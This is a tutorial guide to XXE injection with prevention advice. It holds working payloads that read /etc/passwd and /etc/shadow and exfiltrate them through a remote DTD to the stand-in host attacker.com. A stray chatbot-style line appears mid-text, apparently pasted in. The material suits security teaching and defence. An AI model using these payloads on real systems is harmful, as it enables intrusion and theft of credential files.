# XML External Entity (XXE) Injection — Complete Guide

---

## What is XXE?

**XML External Entity (XXE)** is a vulnerability that occurs when an XML parser allows the processing of external entities. This can allow attackers to:

* Read local files
* Send HTTP requests from the server (SSRF)
* Exfiltrate data to external servers
* Perform denial-of-service (DoS) attacks using recursive entities

---

## XML Entities: Basic Concept

Entities are placeholders defined inside a `<!DOCTYPE>` declaration.

Example:

```xml
<!DOCTYPE data [
  <!ENTITY mydata "Hello">
]>
<root>
  <msg>&mydata;</msg>
</root>
```

This renders:

```xml
<msg>Hello</msg>
```

XML also supports external entities:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

---

## Exploiting XXE

---

## 1. In-Band XXE (Direct Data Retrieval)

The server includes the contents of the referenced file in its response.

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE upload [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<upload>
  <file>&xxe;</file>
</upload>
```

Response:

```xml
<file>root:x:0:0:root:/root:/bin/bash...</file>
```

Best used when server responses are visible.

---

### 2. Out-of-Band (OOB) XXE (Blind Exfiltration)

Used when the server doesn’t return file contents directly. The attacker references a remote DTD file hosted on their server to leak data.

#### Step 1: XML Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE upload SYSTEM "http://attacker.com/malicious.dtd">
<upload>
  <file>&exfil;</file>
</upload>
```

#### Step 2: Remote DTD (malicious.dtd)

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
```

This causes the XML parser to send the contents of `/etc/passwd` to the attacker's server via HTTP.

---

### Base64 Exfiltration Variant

Some files contain newlines or special characters. Encoding them makes exfiltration more reliable.

Remote DTD:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

This sends a base64-encoded version of the file to the attacker.

---

Absolutely. Here's a clearer, practical version of the explanation — now including an example of **what fails** if you don't use parameter entities, and **why**.

---

### Why Use Parameter Entities (`%`)

#### The Basics

* **General entities** (`&name;`) are used **inside XML content**, like:

  ```xml
  <data>&xxe;</data>
  ```

* **Parameter entities** (`%name;`) are used **inside DTDs**, not XML content.
* Only parameter entities can be used to **construct or inject other entities dynamically** during DTD parsing.

#### Why It Matters

When performing an **XXE attack** — especially an **out-of-band (OOB)** attack (exfiltrating data via HTTP) — you often need to:

1. Load a local file (like `/etc/passwd`)
2. Inject that file’s contents into a remote URL (like `http://attacker/?x=...`)
3. Trigger the request via entity expansion

#### What Happens If You Don’t Use Parameter Entities

Here’s a **broken example** that looks like it should work, but fails:

```xml
<!DOCTYPE upload [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY exfil SYSTEM "http://attacker.com/?x=&xxe;">
]>
<upload>
  <file>&exfil;</file>
</upload>
```

**Problem:**

* `&xxe;` is a **general entity**
* You’re trying to use it **inside the SYSTEM URL** of another entity (`exfil`)
* This is **not allowed** by the XML spec
* The parser will treat it as a **literal string**, or throw an error

**Result:**
The server sends:

```console
GET /?x=&xxe;
```

instead of:

```console
GET /?x=root:x:0:0:root:/root:/bin/bash
```

No file content is leaked. The attack fails.

---

### Prevention

* Disable DTD processing in the XML parser
* Use secure libraries (e.g., `defusedxml` in Python)
* Validate XML input strictly
* Isolate XML-handling systems from sensitive files or external networks

---

## Summary Table

| Attack Type          | Description                      | Exfiltration | Visible to Attacker   |
| -------------------- | -------------------------------- | ------------ | --------------------- |
| In-Band XXE          | Returns file content in response | Yes          | Yes                   |
| Out-of-Band XXE      | Sends data to remote server      | Yes          | No (unless monitored) |
| DoS (Billion Laughs) | Resource exhaustion attack       | No           | No                    |

---
